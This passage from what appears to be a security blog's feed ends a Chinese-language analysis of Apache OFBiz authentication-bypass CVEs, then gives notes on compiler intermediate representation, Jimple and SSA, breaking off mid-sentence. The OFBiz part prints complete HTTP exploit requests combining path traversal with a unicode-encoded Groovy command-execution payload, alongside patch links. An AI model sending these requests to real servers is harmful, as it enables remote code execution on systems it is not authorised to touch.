<span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String candidate;</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            candidate = uri;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        candidate = <span class="built_in">this</span>.removePathParameters(candidate);</span><br><span class="line">        candidate = UDecoder.URLDecode(candidate, <span class="built_in">this</span>.connector.getURICharset());</span><br><span class="line">        candidate = RequestUtil.normalize(candidate);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> match;</span><br><span class="line">        <span class="keyword">for</span>(match = canonicalContextPath.equals(candidate); !match &amp;&amp; pos != -<span class="number">1</span>; match = canonicalContextPath.equals(candidate)) &#123;</span><br><span class="line">            pos = <span class="built_in">this</span>.nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">                candidate = uri;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            candidate = <span class="built_in">this</span>.removePathParameters(candidate);</span><br><span class="line">            candidate = UDecoder.URLDecode(candidate, <span class="built_in">this</span>.connector.getURICharset());</span><br><span class="line">            candidate = RequestUtil.normalize(candidate);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (match) &#123;</span><br><span class="line">            <span class="keyword">return</span> pos == -<span class="number">1</span> ? uri : uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(sm.getString(<span class="string">&quot;coyoteRequest.getContextPath.ise&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;canonicalContextPath, uri&#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">除此之外，由于OFBiz的路由功能是通过path决定的，要鉴权就需要通过extensionCheckLogin完成，而在这个函数中会先校验用户名密码，只有用户名密码正确才通过函数hasBasePermission判断是否有对应路径权限，因此需要一个低权限账号来满足前序步骤。</font></p><p>漏洞利用数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h3rmesk1t/../webtools/control/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">: </span>HTTPS</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>webtools.securedLoginId=admin; JSESSIONID=7899116F52229866537976CBD23EFA95.jvm1; JSESSIONID=145B4BBDF7F815B119E02ED19923821C; java-chains-token-key=admin_token; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">USERNAME=bizadmin&amp;PASSWORD=ofbiz&amp;JavaScriptEnabled=Y&amp;groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0033</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">官方补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/b91a9b7f26">https://github.com/apache/ofbiz-framework/commit/b91a9b7f26</a>、<a href="https://github.com/apache/ofbiz-framework/commit/b3b87d98dd">https://github.com/apache/ofbiz-framework/commit/b3b87d98dd</a><font style="color:#000000;">对contextPath也进行了normalize处理。</font></p><h3 id="CVE-2024-32113-CVE-2024-36104"><a href="#CVE-2024-32113-CVE-2024-36104" class="headerlink" title="CVE-2024-32113&amp;CVE-2024-36104"></a><font style="color:#000000;">CVE-2024-32113&amp;CVE-2024-36104</font></h3><p><font style="color:#000000;">这两个漏洞的本质还是对CVE-2024-25065的补丁进行一个绕过，无论是getRequestURI方法还getRequestURL方法都不会做URL解码，因此可以采用编码来进行绕过，另外也可以配合分号的使用绕过校验（CVE-2024-36104）。</font></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h3rmesk1t/%2e%2e/webtools/control/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">: </span>HTTPS</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>webtools.securedLoginId=admin; JSESSIONID=7899116F52229866537976CBD23EFA95.jvm1; JSESSIONID=145B4BBDF7F815B119E02ED19923821C; java-chains-token-key=admin_token; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">USERNAME=bizadmin&amp;PASSWORD=ofbiz&amp;JavaScriptEnabled=Y&amp;groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0033</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p>对于上述利用手法，官方采用正则的方式进行修复<a href="https://github.com/apache/ofbiz-framework/commit/d33ce31012">https://github.com/apache/ofbiz-framework/commit/d33ce31012</a>。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://t.zsxq.com/AEbMP">Apache OFBiz漏洞CVE-2023-49070的前世今生</a></p><p><a href="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/">Apache OFBiz Authentication Bypass(CVE-2024-38856)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南大软分学习笔记-Intermediate Representation</title>
      <link href="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/"/>
      <url>/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/</url>
      
        <content type="html"><![CDATA[<h2 id="Compilers-and-Static-Analyzers"><a href="#Compilers-and-Static-Analyzers" class="headerlink" title="Compilers and Static Analyzers"></a>Compilers and Static Analyzers</h2><p><font style="color:#000000;">编译通常包括</font><strong><font style="color:#000000;">词法分析、语法分析、语义分析</font></strong><font style="color:#000000;">等过程，最终生成机器码。源代码向机器码转化的过程大致如下：</font></p><ol><li><font style="color:#000000;">在词法分析阶段，编译器将源程序分成一个一个的Token，划分出是关键字还是标识符还是运算符等，利用Regular Expression（正则表达式）来实现；</font></li><li><font style="color:#000000;">在语法分析阶段，将一个个的Token组成句子，利用Context-Free Grammar（上下文无关文法，CFG）来实现，构造出AST；</font></li><li><font style="color:#000000;">在语义分析阶段，会进行类型检测等，构造出修饰后的AST；</font></li><li><font style="color:#000000;">在翻译阶段，常将Decorated AST翻译为生成三地址码这样的中间表示形式（Intermediate Representation，IR），并基于IR进行静态分析（例如代码优化等）；</font></li><li><font style="color:#000000;">在机器码生成阶段，将IR转化成物理CPU能够直接执行的比特序列，即机器代码。</font></li></ol><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729751715002-de576258-83d9-4b60-a2f3-590e9e3de3cf.png"></p><h2 id="AST-vs-IR"><a href="#AST-vs-IR" class="headerlink" title="AST vs IR"></a>AST vs IR</h2><p><font style="color:#000000;">在编译过程中可以看到有两类中间结果：AST和IR，那么为什么静态分析基于IR进行实现而不是选择AST呢？</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729753042989-1820126b-ced5-4b27-8aa6-2edf25688172.png"></p><p><font style="color:#000000;">在上图例子中可以看出IR相较于AST有如下优点，因此IR更适合作为静态分析的基础。</font></p><ol><li><font style="color:#000000;">AST是high-level且接近语法结构的，而IR是low-level且接近机器代码的。</font></li><li><font style="color:#000000;">AST是依赖于语言的，IR通常是独立于语言的，三地址码会被分析器重点关注，因为可以将各种前端语言统一翻译成同一种IR再加以优化。</font></li><li><font style="color:#000000;">AST适合快速类型检查，IR的结构更加紧凑和统一，在AST中包含了很多非终结符所占用的结点（body，assign等），而IR中不会需要到这些信息。</font></li><li><font style="color:#000000;">AST缺少控制流信息，IR包含了控制流信息，AST中只是有结点表明了这是一个do-while结构，但是无法看出控制流信息，而IR中的goto等信息可以轻易看出控制流。</font></li></ol><p><font style="color:#000000;">总结而言，AST与IR各有以下特点。</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729785010080-919954f9-9e55-4a58-bc99-e676deb43453.png"></p><h2 id="Three-Address-Code"><a href="#Three-Address-Code" class="headerlink" title="Three-Address Code"></a>Three-Address Code</h2><p><font style="color:#000000;">I</font><strong><font style="color:#000000;">R常用的表示形式是三地址码</font></strong><font style="color:#000000;">（3-Address Code，简称3AC），其通常没有统一的格式。</font></p><p><strong><font style="color:#000000;">三地址码要求在一个指令的右边至多只有一个操作符</font></strong><font style="color:#000000;">，例如，对于a + b + 3这样的语句，3AC需要引入临时变量来将其转换为指令t1 &#x3D; a + b和指令t2 &#x3D; t1 + 3。</font></p><p><font style="color:#000000;">所谓三地址码，指的是每个3AC指令可以至多包含三种地址：</font><strong><font style="color:#000000;">变量名</font></strong><font style="color:#000000;">（例如a，b等）、</font><strong><font style="color:#000000;">常量</font></strong><font style="color:#000000;">（例如3，-100等）以及</font><strong><font style="color:#000000;">编译器生成的临时变量</font></strong><font style="color:#000000;">（例如t1，t2等）。</font></p><p><font style="color:#000000;">下面是一些常见的3AC形式：</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729785903547-f1cea9e6-6fa8-448d-befc-1b634c6b0daf.png"></p><p><font style="color:#000000;">3AC在真实静态分析中的应用，</font><a href="https://github.com/soot-oss/soot"><font style="color:#000000;">https://github.com/soot-oss/soot</font></a><font style="color:#000000;">。Soot是一种到Java静态分析框架，它的IR叫做Jimple，一种有类型的三地址码（Typed 3AC）。</font></p><p><font style="color:#000000;">Soot下载地址可以参考：</font><a href="https://repo.maven.apache.org/maven2/org/soot-oss/soot/"><font style="color:#000000;">https://repo.maven.apache.org/maven2/org/soot-oss/soot/</font></a><font style="color:#000000;">，以下是几个Jimple的示例。</font></p><ul><li><font style="color:#000000;">Do-While Loop</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoWhileLoop3AC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (arr[i] &lt; <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预先生成class文件，然后再执行Soot</span></span><br><span class="line">javac DoWhileLoop3AC.java</span><br><span class="line">java -<span class="built_in">cp</span> soot-4.6.0-jar-with-dependencies.jar:slf4j-nop-2.0.16.jar soot.Main -f J -pp -<span class="built_in">cp</span> . DoWhileLoop3AC</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoWhileLoop3AC</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Object</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        DoWhileLoop3AC r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>: DoWhileLoop3AC;</span><br><span class="line"></span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span>[] r0;</span><br><span class="line">        <span class="type">int</span> $i0, $i1, i2;</span><br><span class="line">        java.lang.String[] r1;</span><br><span class="line"></span><br><span class="line">        r1 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line"></span><br><span class="line">        r0 = newarray (<span class="type">int</span>)[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">        i2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        label1:</span><br><span class="line">        $i1 = i2 + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        i2 = $i1;</span><br><span class="line"></span><br><span class="line">        $i0 = r0[$i1];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> $i0 &lt; <span class="number">10</span> <span class="keyword">goto</span> label1;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">Method Call</font><ul><li><font style="color:#000000;">invokespecial：call constructor，call superclass methods，call private methods</font></li><li><font style="color:#000000;">invokevirtual：instance methods call（virtual dispatch，派生）</font></li><li><font style="color:#000000;">invokeInterface：cannot optimization，checking interface implementation</font></li><li><font style="color:#000000;">invokestatic：call static methods</font></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodCall3AC</span> &#123;</span><br><span class="line">    String <span class="title function_">foo</span><span class="params">(String para1, String para2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> para1 + <span class="string">&quot; &quot;</span> + para2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MethodCall3AC</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodCall3AC</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> mc.foo(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预先生成class文件，然后再执行Soot</span></span><br><span class="line">javac MethodCall3AC.java</span><br><span class="line">java -<span class="built_in">cp</span> soot-4.6.0-jar-with-dependencies.jar:slf4j-nop-2.0.16.jar soot.Main -f J -pp -<span class="built_in">cp</span> . MethodCall3AC</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodCall3AC</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Object</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        MethodCall3AC r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>: MethodCall3AC;</span><br><span class="line"></span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    java.lang.String <span class="title function_">foo</span><span class="params">(java.lang.String, java.lang.String)</span></span><br><span class="line">    &#123;</span><br><span class="line">        MethodCall3AC r3;</span><br><span class="line">        java.lang.String r0, r1, $r2;</span><br><span class="line"></span><br><span class="line">        r3 := <span class="meta">@this</span>: MethodCall3AC;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@parameter0</span>: java.lang.String;</span><br><span class="line"></span><br><span class="line">        r1 := <span class="meta">@parameter1</span>: java.lang.String;</span><br><span class="line"></span><br><span class="line">        $r2 = dynamicinvoke <span class="string">&quot;makeConcatWithConstants&quot;</span> &lt;java.lang.String (java.lang.String,java.lang.String)&gt;(r0, r1) &lt;java.lang.invoke.StringConcatFactory: java.lang.invoke.CallSite <span class="title function_">makeConcatWithConstants</span><span class="params">(java.lang.invoke.MethodHandles$Lookup,java.lang.String,java.lang.invoke.MethodType,java.lang.String,java.lang.Object[])</span>&gt;(<span class="string">&quot;\u0001 \u0001&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $r2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        java.lang.String[] r1;</span><br><span class="line">        MethodCall3AC $r0;</span><br><span class="line"></span><br><span class="line">        r1 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line"></span><br><span class="line">        $r0 = <span class="keyword">new</span> <span class="title class_">MethodCall3AC</span>;</span><br><span class="line"></span><br><span class="line">        specialinvoke $r0.&lt;MethodCall3AC: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        virtualinvoke $r0.&lt;MethodCall3AC: java.lang.String <span class="title function_">foo</span><span class="params">(java.lang.String,java.lang.String)</span>&gt;(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><font style="color:#000000;">Class</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Class3AC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> <span class="variable">pi</span> <span class="operator">=</span> <span class="number">3.14</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预先生成class文件，然后再执行Soot</span></span><br><span class="line">javac Class3AC.java</span><br><span class="line">java -<span class="built_in">cp</span> soot-4.6.0-jar-with-dependencies.jar:slf4j-nop-2.0.16.jar soot.Main -f J -pp -<span class="built_in">cp</span> . Class3AC</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Class3AC</span> <span class="keyword">extends</span> <span class="title class_">java</span>.lang.Object</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">double</span> pi;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> &lt;init&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        Class3AC r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@this</span>: Class3AC;</span><br><span class="line"></span><br><span class="line">        specialinvoke r0.&lt;java.lang.Object: <span class="keyword">void</span> &lt;init&gt;()&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span></span><br><span class="line">    &#123;</span><br><span class="line">        java.lang.String[] r0;</span><br><span class="line"></span><br><span class="line">        r0 := <span class="meta">@parameter0</span>: java.lang.String[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;clinit&gt;()</span><br><span class="line">    &#123;</span><br><span class="line">        &lt;Class3AC: <span class="type">double</span> pi&gt; = <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Static-Single-Assignment"><a href="#Static-Single-Assignment" class="headerlink" title="Static Single Assignment"></a>Static Single Assignment</h2><p><font style="color:#000000;">Static Single Assignment（静态单一赋值，SSA），在3AC的基础上，</font><strong><font style="color:#000000;">SSA指的是所有赋值操作的被赋值变量都需要有一个单独的名字</font></strong><font style="color:#000000;">。每个定义都会有一个新名字，这个新名字可以应用在后续的分析中，每个变量都有一个定义。</font></p><ul><li><font style="color:#000000;">Give each definition a fresh name</font></li><li><font style="color:#000000;">Propagate fresh name to subsequent uses</font></li><li><font style="color:#000000;">Every variable has exactly one definition</font></li></ul><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729847552420-1f1fab94-76df-4c9d-a5de-b7374f7cece6.png"></p><p><font style="color:#000000;">但是有些时候，某些变量可能受到条件分支影响，处于控制流汇聚的位置（control flow merges），此时就需要使用φ函数来处理，其中，φ(x</font><sub><font style="color:#000000;">0</font></sub><font style="color:#000000;">,x</font><sub><font style="color:#000000;">1</font></sub><font style="color:#000000;">)的值由控制流经过的条件分支决定。</font></p><p><img src="/2024/10/27/%E5%8D%97%E5%A4%A7%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Intermediate-Representation/1729847688406-4d7dda1f-635a-4d8c-94b9-c95e5df17272.png"></p><p><font style="color:#000000;">SSA的优缺点如下：</font></p><ul><li>优点<ul><li><font style="color:#000000;">控制流信息可以间接融合到独特变量名中，简化分析过程</font></li><li><font style="color:#000000;">Define-and-Use配对是明确清楚的</font></li></ul></li><li>缺点<ul><li><font 